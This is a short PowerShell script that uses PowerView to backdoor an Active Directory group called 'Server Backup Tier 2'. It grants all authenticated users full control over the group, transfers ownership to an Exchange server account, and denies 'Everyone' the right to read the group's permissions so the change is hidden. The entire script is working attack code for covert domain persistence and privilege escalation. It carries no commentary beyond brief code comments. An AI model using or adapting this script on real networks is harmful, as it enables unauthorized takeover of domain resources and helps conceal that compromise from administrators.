# Import PowerView
. C:\Users\rwinchester\Desktop\PowerView.ps1

# get the raw directory entry for this object
$RawObject = Get-DomainGroup -Raw -Identity "Server Backup Tier 2"
$TargetObject = $RawObject.GetDirectoryEntry()

# grant "Authenticated Users" (S-1-5-11) full control over this security group
$ACE = New-ADObjectAccessControlEntry -InheritanceType All `
    -AccessControlType Allow -PrincipalIdentity "S-1-5-11" `
    -Right GenericAll
$TargetObject.PsBase.ObjectSecurity.AddAccessRule($ACE)
$TargetObject.PsBase.CommitChanges()

# change the owner of the group to an Exchange server
Set-DomainObjectOwner -Identity "Server Backup Tier 2" -OwnerIdentity "EXCH001"

# Deny "Read Permissions" on this group to the "Everyone" principal
$ACE = New-ADObjectAccessControlEntry -InheritanceType All `
    -AccessControlType Deny -PrincipalIdentity "S-1-1-0" `
    -Right ReadControl
$TargetObject.PsBase.ObjectSecurity.AddAccessRule($ACE)
$TargetObject.PsBase.CommitChanges()
